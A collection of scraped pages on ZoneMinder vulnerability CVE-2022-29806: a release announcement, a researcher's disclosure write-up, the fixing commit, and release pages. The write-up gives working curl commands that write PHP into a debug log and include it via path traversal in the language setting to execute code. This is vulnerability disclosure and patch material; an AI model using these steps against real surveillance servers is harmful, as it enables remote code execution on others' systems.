=== Content from packetstormsecurity.com_2e046dee_20250114_190938.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from forums.zoneminder.com_cd340163_20250114_190939.html ===


# ZoneMinder Forums

ZoneMinder Forums

[Skip to content](#start_here)

Search

[Advanced search](./search.php?sid=b91619475f1d18ed31d2adf8ddf60a31 "Advanced search")

* Quick links

  + [Unanswered topics](./search.php?search_id=unanswered&sid=b91619475f1d18ed31d2adf8ddf60a31)
  + [Active topics](./search.php?search_id=active_topics&sid=b91619475f1d18ed31d2adf8ddf60a31)
  + [Search](./search.php?sid=b91619475f1d18ed31d2adf8ddf60a31)
* [FAQ](/help/faq?sid=b91619475f1d18ed31d2adf8ddf60a31 "Frequently Asked Questions")
* [Login](./ucp.php?mode=login&redirect=viewtopic.php%3Ft%3D31638&sid=b91619475f1d18ed31d2adf8ddf60a31 "Login")
* [Register](./ucp.php?mode=register&sid=b91619475f1d18ed31d2adf8ddf60a31)

* [Home](https://forums.zoneminder.com)
  [Board index](./index.php?sid=b91619475f1d18ed31d2adf8ddf60a31)
  [General](./viewforum.php?f=25&sid=b91619475f1d18ed31d2adf8ddf60a31)
  [Announcements](./viewforum.php?f=1&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [Search](./search.php?sid=b91619475f1d18ed31d2adf8ddf60a31 "View the advanced search options")

## [Released 1.36.13 The Memory Remains](./viewtopic.php?t=31638&sid=b91619475f1d18ed31d2adf8ddf60a31)

Information and announcements regarding the website and forums in general.

[Post Reply](./posting.php?mode=reply&t=31638&sid=b91619475f1d18ed31d2adf8ddf60a31 "Post a reply")

Search

[Advanced search](./search.php?sid=b91619475f1d18ed31d2adf8ddf60a31 "Advanced search")

1 post
• Page **1** of **1**

[![User avatar](./download/file.php?avatar=17112_1483804439.jpg)](./memberlist.php?mode=viewprofile&u=17112&sid=b91619475f1d18ed31d2adf8ddf60a31)
[iconnor](./memberlist.php?mode=viewprofile&u=17112&sid=b91619475f1d18ed31d2adf8ddf60a31)
**Posts:** [3276](./search.php?author_id=17112&sr=posts&sid=b91619475f1d18ed31d2adf8ddf60a31) **Joined:** Fri Oct 29, 2010 1:43 am
**Location:** Toronto
**Contact:**
Contact iconnor

Skype

### [Released 1.36.13 The Memory Remains](./viewtopic.php?p=125914&sid=b91619475f1d18ed31d2adf8ddf60a31#p125914)

* [Quote](./posting.php?mode=quote&p=125914&sid=b91619475f1d18ed31d2adf8ddf60a31 "Reply with quote")

[Post](./viewtopic.php?p=125914&sid=b91619475f1d18ed31d2adf8ddf60a31#p125914 "Post")
by **[iconnor](./memberlist.php?mode=viewprofile&u=17112&sid=b91619475f1d18ed31d2adf8ddf60a31)** » Wed Mar 30, 2022 7:04 pm

**Changes since 1.36.12**

- Change a warning to a Debug when getting the latest image using zmu

- Updates to Axis PTZ script adding support for getting details from Path and fixing support for older cameras

- Fix for update script for 1.35.25 and DayEventDiskSpace

- include user and function error message about insufficient permissions. Will make it easier to figure out who tried what.

- Fix for crash in CSRF

- Fix missing text-right align on Port/Path labels. Set step to 1 for Port

- Remote RTSP camera.

- Fix fail to get Sources in Remote RTSP

- Fix compilation with ffmpeg 5.0

- Implement filter limits. Which go before pagination/advanced search limits

- Fix do\_debian\_package build script for version = CURRENT style versioning.

- Implement a check on change of language. Make sure that the specified language file exists. Reports errors to UI

- Test for valid language file when saving user.

- add styling for errors reported to ui and include the errors on options view

- Fix zmu device probing

- Change title of v4l settings button to give an indication WHY it isn't enabled

- Convert Fatal()s to Errors() in image viewing. Maybe Fixes [\#3426]

- Include EndDateTimeShort in event stats

- Handle empty endtime (in progress event) more gracefully. If there is a next event just jump to it.

- locking fixes that caused hung zmu and zms processes

- Set mysql character set to utf8 explicitly to support chinese characters (or other special characters).

- escape html in Storage names

- fix auth'd user information being saved to session before switching session id's leaving bogus authenticated user in previous session.

- Fix potential XSS from Username

- Add a pattern filter for Usernames, Group Names and Storage Names to prevent invalid characters and XSS

- Add NOT IN case to filters. Also, fix bad SQL when value evals to false. Test for empty string instead. Fixes [#3425](https://github.com/ZoneMinder/zoneminder/issues/3425)

- Fix CURL monitors

- Fix event view corruption caused by changes to the sendfile system call.Fixes [#3437](https://github.com/ZoneMinder/zoneminder/issues/3437)

- Add useful title to frame image telling us which we are looking at

- Allow empty sort field when listing events

- Fix error in PTZ control code when no speed has been defined.

- Allow editing of admin user.

- Add more of the resulting SQL to the filter debug modal

- Make filter debug modal work on non-saved filter

- improvements to Event module implementing a Server() function which figures out which Server likely has the video. Use it to remove duplicate logic

- improvements to Zone module Add numCoords, Coords, Area, AlarmRGB to Zone object. Also add Points(), AreaCoords, svg\_polygon

- Implement zm\_setcookie to simplify setting cookies, set samesite, deal with older php etc

- add loading=lazy to most images to improve page loading

- Don't bother running zmu if monitor Function is set to None

- Add mp4 as an option for generated video and make it the default instead of avi

- Set some new more sensible defaults for various settings including logging, navbar refreshes, full page refreshes and ajax timeouts

- Big update to Control.pm

- Fix for Netcat PTZ using x=0 y=0 for autostop in addition to old stop movement code

- Implement reboot and ping methods for Trendnet PTZ Control

- rough in Url, UrlToZMS PathToZMS PathToIndex, UrlToIndex UrlToApi PathToApi in SERver object

- reduce debug logging in zmaudit

**There are fixes in here for 3 vulnerabilities:**

Remote code execution by specifying an invalid language found by Krastanoel.

Stored XSS in Username field found by Tester Tester

Session Fixation problem found by Tester Tester.

[1.36.13](https://github.com/ZoneMinder/zoneminder/tree/1.36.13)

[Full Changelog](https://github.com/ZoneMinder/zoneminder/compare/1.36.12...1.36.13)

[Top](#top "Top")

[Post Reply](./posting.php?mode=reply&t=31638&sid=b91619475f1d18ed31d2adf8ddf60a31 "Post a reply")
1 post
• Page **1** of **1**

[Return to “Announcements”](./viewforum.php?f=1&sid=b91619475f1d18ed31d2adf8ddf60a31)

Jump to

* [General](./viewforum.php?f=25&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Announcements](./viewforum.php?f=1&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Website Issues](./viewforum.php?f=13&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [Support](./viewforum.php?f=26&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.36.x](./viewforum.php?f=43&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.34.x](./viewforum.php?f=40&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Mobile Apps and Event Server](./viewforum.php?f=33&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Docker](./viewforum.php?f=41&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder Distributions](./viewforum.php?f=6&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder Translations](./viewforum.php?f=15&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Archive [End of Life Versions]](./viewforum.php?f=35&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.35.x Development Branch](./viewforum.php?f=42&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.33.x Development Branch](./viewforum.php?f=39&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.32.x](./viewforum.php?f=38&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.31.x](./viewforum.php?f=37&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.30.x](./viewforum.php?f=36&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.29.x](./viewforum.php?f=34&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.28.x](./viewforum.php?f=32&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.27.x](./viewforum.php?f=31&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.26.x](./viewforum.php?f=30&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.25.x](./viewforum.php?f=29&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.24.x](./viewforum.php?f=21&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder Previous Versions](./viewforum.php?f=5&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [Development](./viewforum.php?f=27&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder 1.37.x Development Branch](./viewforum.php?f=44&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Feature Requests](./viewforum.php?f=8&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   User Contributions](./viewforum.php?f=9&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [Miscellaneous](./viewforum.php?f=28&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   ZoneMinder Hints & Tips](./viewforum.php?f=11&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Non-ZoneMinder Chat](./viewforum.php?f=12&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Jobs / For Sale / Wanted / Exchange](./viewforum.php?f=20&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Hardware Compatibility List](./viewforum.php?f=10&sid=b91619475f1d18ed31d2adf8ddf60a31)
* [↳   Hardware Queries](./viewforum.php?f=14&sid=b91619475f1d18ed31d2adf8ddf60a31)

* [Home](https://forums.zoneminder.com) [Board index](./index.php?sid=b91619475f1d18ed31d2adf8ddf60a31)
* All times are UTC
* [Delete cookies](/user/delete_cookies?sid=b91619475f1d18ed31d2adf8ddf60a31)
* [Contact us](./memberlist.php?mode=contactadmin&sid=b91619475f1d18ed31d2adf8ddf60a31)

Powered by [phpBB](https://www.phpbb.com/)® Forum Software © phpBB Limited

[Privacy](./ucp.php?mode=privacy&sid=b91619475f1d18ed31d2adf8ddf60a31 "Privacy")
|
[Terms](./ucp.php?mode=terms&sid=b91619475f1d18ed31d2adf8ddf60a31 "Terms")

###



=== Content from krastanoel.com_f26ae76e_20250114_190943.html ===

[# krastanoel](/)

* [about](/about)
* [cve](/cve)
* [contrib](/contribution)
* [exploit](/exploit)

# CVE-2022-29806

# Product

[ZoneMinder - A full-featured, open source, state-of-the-art video surveillance software system.](https://zoneminder.com/)

# Versions Affected

* 1.36.12 and earlier
* 1.37.10 and earlier

# Description

A Path Traversal vulnerability in debug log file and default language option in ZoneMinder version before 1.36.13 and 1.37.11 allows attackers to write and execute arbitrary code to achieve remote command execution.

# Technical Details

Looking at **ZM\_LOG\_DEBUG\_FILE** validation in [includes/logger.php#L138](https://github.com/ZoneMinder/zoneminder/blob/f0791c81184bc4cc558fe84205cec9b196c9f1ac/web/includes/logger.php#L138), you could potentially create a file with any extension on any path in the system because it only checks if the variable is not empty.

```
if ( ZM_LOG_DEBUG_FILE != '' ) {
  $tempLogFile = ZM_LOG_DEBUG_FILE;
  $tempFileLevel = $tempLevel;
}

```

This will lead to arbitrary file write if you could control the contents being written to the file. Luckily there is a `createRequest` function in [ajax/log.php#L48](https://github.com/ZoneMinder/zoneminder/blob/d135be17ba5801ff6cda7e574a3275569fc920b8/web/ajax/log.php#L48) that can be used to achieve this.

```
function createRequest() {
  if ( !empty($_POST['level']) && !empty($_POST['message']) ) {
    ...
    $string = $_POST['message'];
    ...
    ZM\Logger::fetch()->logPrint($level, $string, $file, $line);
  } else {
    ZM\Error('Invalid log create: '.print_r($_POST, true));
  }
}

```

The `$string` variable can easily be controlled from `$_POST['message']` parameter that has no validation whatsoever. You may guess where this is going now, right? Thatâs right, the only thing left is the ability to include the file to achieve code execution.
Looking at **ZM\_LANG\_DEFAULT** validation in [includes/lang.php#L46](https://github.com/ZoneMinder/zoneminder/blob/f0791c81184bc4cc558fe84205cec9b196c9f1ac/web/includes/lang.php#L46), specifically how the `$systemLangFile` variable is defined clearly suffers from a path traversal vulnerability.

```
$systemLangFile = $prefix.'lang/'.ZM_LANG_DEFAULT.'.php';
if ( file_exists($systemLangFile) ) {
  return $systemLangFile;
} else {
  ZM\Warning("System language file $systemLangFile does not exist.");
}

```

This will lead to arbitrary code execution as you have control over **ZM\_LANG\_DEFAULT** value that gets appended with â`.php`â automatically at the end, it will only check if the file exists and then gets executed in [includes/lang.php#L63](https://github.com/ZoneMinder/zoneminder/blob/f0791c81184bc4cc558fe84205cec9b196c9f1ac/web/includes/lang.php#L63) which was triggered from [index.php#L194](https://github.com/ZoneMinder/zoneminder/blob/f0791c81184bc4cc558fe84205cec9b196c9f1ac/web/index.php#L194).

# Proof of Concept

The proof of concept was tested against ZoneMinder 1.36.4 ubuntu18.04 docker: [ZoneMinder/zmdockerfiles](https://github.com/ZoneMinder/zmdockerfiles) but will still applicable up to the latest version 1.36.12

1. Start the container with `docker run` command: [ZoneMinder/zmdockerfiles#ubuntu](https://github.com/ZoneMinder/zmdockerfiles#ubuntu)
2. Navigate to <http://localhost:1080/zm/index.php?view=privacy> and click **APPLY** to activate the dashboard
3. Navigate to <http://localhost:1080/zm/index.php?view=options&tab=logging>
4. Tick the **LOG\_DEBUG** option to switch debugging on
5. Set **LOG\_DEBUG\_FILE** option to `/tmp/proof.php` and then click the save button
6. Make a GET request to `/zm/index.php` to grep the `csrfMagicToken` and save the cookies using `curl`
   ```
   sam:~$ curl -sc ck.txt -b ck.txt http://localhost:1080/zm/index.php | grep -oP 'csrfMagicToken = "\K\w.*(?=";var)'
   key:4a95ee2aec4a3177b56f1ebc20c61f95c161447a,1644031701

   ```
7. Using `csrfMagicToken` value and cookies in step 6, make a POST request to `/zm/index.php` to create log message with arbitrary PHP code. eg: `message=<?php phpinfo(); die();?>`
   ```
   sam:~$ curl -sc ck.txt -b ck.txt http://localhost:1080/zm/index.php -d '__csrf_magic=key:4a95ee2aec4a3177b56f1ebc20c61f95c161447a,1644031701&view=request&request=log&task=create&level=ERR&message=<?php phpinfo(); die();?>&file=/tmp/proof.php'
   {"result":"Ok"}

   ```
8. Make a POST request to `/zm/index.php` to change system default language to include the debug log file. eg: `newConfig[ZM_LANG_DEFAULT]=../../../../../tmp/proof`
   ```
   sam:~$ curl -sc ck.txt -b ck.txt http://localhost:1080/zm/index.php -d '__csrf_magic=key:4a95ee2aec4a3177b56f1ebc20c61f95c161447a,1644031701&view=options&tab=system&action=options&newConfig[ZM_LANG_DEFAULT]=../../../../../tmp/proof' -L

   ```
9. Navigate to <http://localhost:1080/zm/index.php> or refresh your current zoneminder page and PHP Info will be displayed.

![](/assets/images/posts/zoneminder-rce-phpinfo.png)

The video below is the proof of concept in action.

# Exploitation

Using the proof of concept steps I will craft an exploit script to automate the process. The video below will showcase the shell execution.

# Mitigation

There are two possible mitigations but the obvious fix is to validate **ZM\_LANG\_DEFAULT** option in [includes/lang.php#L46](https://github.com/ZoneMinder/zoneminder/blob/f0791c81184bc4cc558fe84205cec9b196c9f1ac/web/includes/lang.php#L46) to prevent the path traversal. We could also validate the **ZM\_LOG\_DEBUG\_FILE** to only allow specific file extension eg: `.txt,.log` or define static directory where the log file should be written eg: `/var/log/zm` to prevent future chained attacks.

# Timeline

* 08/02/2022 - Vulnerability reported to the vendor
* 08/02/2022 - Vulnerability acknowledged by the vendor
* 09/02/2022 - Vendor implements vulnerability fix in master branch
* 10/02/2022 - Test and confirm the POC no longer works in master branch versions **1.37.11**
* 31/03/2022 - 1.36.13 version released
* 25/04/2022 - Requesting CVE-ID to MITRE
* 26/04/2022 - CVE-2022-29806 assigned
* 27/04/2022 - Full disclosure

# References

* [CVE-2022-29806](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29806)

Copyright © 2023 . Powered by [Jekyll](http://jekyllrb.com).



=== Content from github.com_9de0f6b7_20250114_190940.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2Fzoneminder%2Fcommit%2F9fee64b62fbdff5bf5ece1d617f1f53c7b1967cb)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2Fzoneminder%2Fcommit%2F9fee64b62fbdff5bf5ece1d617f1f53c7b1967cb)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=ZoneMinder%2Fzoneminder)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ZoneMinder](/ZoneMinder)
/
**[zoneminder](/ZoneMinder/zoneminder)**
Public

* [Notifications](/login?return_to=%2FZoneMinder%2Fzoneminder) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2FZoneMinder%2Fzoneminder)
* [Star
   5.3k](/login?return_to=%2FZoneMinder%2Fzoneminder)

* [Code](/ZoneMinder/zoneminder)
* [Issues
  154](/ZoneMinder/zoneminder/issues)
* [Pull requests
  12](/ZoneMinder/zoneminder/pulls)
* [Discussions](/ZoneMinder/zoneminder/discussions)
* [Actions](/ZoneMinder/zoneminder/actions)
* [Projects
  0](/ZoneMinder/zoneminder/projects)
* [Wiki](/ZoneMinder/zoneminder/wiki)
* [Security](/ZoneMinder/zoneminder/security)
* [Insights](/ZoneMinder/zoneminder/pulse)

Additional navigation options

* [Code](/ZoneMinder/zoneminder)
* [Issues](/ZoneMinder/zoneminder/issues)
* [Pull requests](/ZoneMinder/zoneminder/pulls)
* [Discussions](/ZoneMinder/zoneminder/discussions)
* [Actions](/ZoneMinder/zoneminder/actions)
* [Projects](/ZoneMinder/zoneminder/projects)
* [Wiki](/ZoneMinder/zoneminder/wiki)
* [Security](/ZoneMinder/zoneminder/security)
* [Insights](/ZoneMinder/zoneminder/pulse)

## Commit

[Permalink](/ZoneMinder/zoneminder/commit/9fee64b62fbdff5bf5ece1d617f1f53c7b1967cb)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

detaint language file.

[Browse files](/ZoneMinder/zoneminder/tree/9fee64b62fbdff5bf5ece1d617f1f53c7b1967cb)
Browse the repository at this point in the history

* Loading branch information

Isaac Connor
committed
Feb 8, 2022

1 parent
[2db781e](/ZoneMinder/zoneminder/commit/2db781ed4419971d299ae3456c7407e74995dbb6)

commit 9fee64b

Showing
**1 changed file**
with
**6 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

11 changes: 6 additions & 5 deletions

11
[web/includes/lang.php](#diff-75f4612f0de50a9baae4ddf8b7d70f6ac17b8aacb3d5963d69fab16485959c98 "web/includes/lang.php")

Show comments

[View file](/ZoneMinder/zoneminder/blob/9fee64b62fbdff5bf5ece1d617f1f53c7b1967cb/web/includes/lang.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -30,20 +30,21 @@ function translate($name) { |
|  |  | function loadLanguage($prefix='') { |
|  |  | global $user; |
|  |  |  |
|  |  | if ( $prefix ) |
|  |  | if ($prefix) |
|  |  | $prefix = $prefix.'/'; |
|  |  |  |
|  |  | if ( isset($user['Language']) and $user['Language'] ) { |
|  |  | $userLangFile = $prefix.'lang/'.$user['Language'].'.php'; |
|  |  | if (isset($user['Language']) and $user['Language']) { |
|  |  | # Languages can only have letters, numbers and underscore |
|  |  | $userLangFile = $prefix.'lang/'.preg\_replace('/[^[:alnum:]\_]+/', '', $user['Language']).'.php'; |
|  |  |  |
|  |  | if ( file\_exists($userLangFile) ) { |
|  |  | if (file\_exists($userLangFile)) { |
|  |  | return $userLangFile; |
|  |  | } else { |
|  |  | ZM\Warning("User language file $userLangFile does not exist."); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | $systemLangFile = $prefix.'lang/'.ZM\_LANG\_DEFAULT.'.php'; |
|  |  | $systemLangFile = $prefix.'lang/'.preg\_replace('/[^[:alnum:]\_]+/', '', ZM\_LANG\_DEFAULT).'.php'; |
|  |  | if ( file\_exists($systemLangFile) ) { |
|  |  | return $systemLangFile; |
|  |  | } else { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `9fee64b`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2Fzoneminder%2Fcommit%2F9fee64b62fbdff5bf5ece1d617f1f53c7b1967cb) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_0caee609_20250114_190942.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2Fzoneminder%2Freleases%2Ftag%2F1.36.13)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FZoneMinder%2Fzoneminder%2Freleases%2Ftag%2F1.36.13)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=ZoneMinder%2Fzoneminder)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ZoneMinder](/ZoneMinder)
/
**[zoneminder](/ZoneMinder/zoneminder)**
Public

* [Notifications](/login?return_to=%2FZoneMinder%2Fzoneminder) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2FZoneMinder%2Fzoneminder)
* [Star
   5.3k](/login?return_to=%2FZoneMinder%2Fzoneminder)

* [Code](/ZoneMinder/zoneminder/tree/1.36.13)
* [Issues
  154](/ZoneMinder/zoneminder/issues)
* [Pull requests
  12](/ZoneMinder/zoneminder/pulls)
* [Discussions](/ZoneMinder/zoneminder/discussions)
* [Actions](/ZoneMinder/zoneminder/actions)
* [Projects
  0](/ZoneMinder/zoneminder/projects)
* [Wiki](/ZoneMinder/zoneminder/wiki)
* [Security](/ZoneMinder/zoneminder/security)
* [Insights](/ZoneMinder/zoneminder/pulse)

Additional navigation options

* [Code](/ZoneMinder/zoneminder/tree/1.36.13)
* [Issues](/ZoneMinder/zoneminder/issues)
* [Pull requests](/ZoneMinder/zoneminder/pulls)
* [Discussions](/ZoneMinder/zoneminder/discussions)
* [Actions](/ZoneMinder/zoneminder/actions)
* [Projects](/ZoneMinder/zoneminder/projects)
* [Wiki](/ZoneMinder/zoneminder/wiki)
* [Security](/ZoneMinder/zoneminder/security)
* [Insights](/ZoneMinder/zoneminder/pulse)

1. [Releases](/ZoneMinder/zoneminder/releases)
2. [1.36.13](/ZoneMinder/zoneminder/releases/tag/1.36.13)

# The Memory Remains 1.36.13

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/ZoneMinder/zoneminder/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...1.36.13)

 Loading

[View all tags](/ZoneMinder/zoneminder/tags)

![@connortechnology](https://avatars.githubusercontent.com/u/925519?s=40&v=4)
[connortechnology](/connortechnology)
released this
30 Mar 18:53

·
[846 commits](/ZoneMinder/zoneminder/compare/1.36.13...release-1.36)
to release-1.36
since this release

[1.36.13](/ZoneMinder/zoneminder/tree/1.36.13)

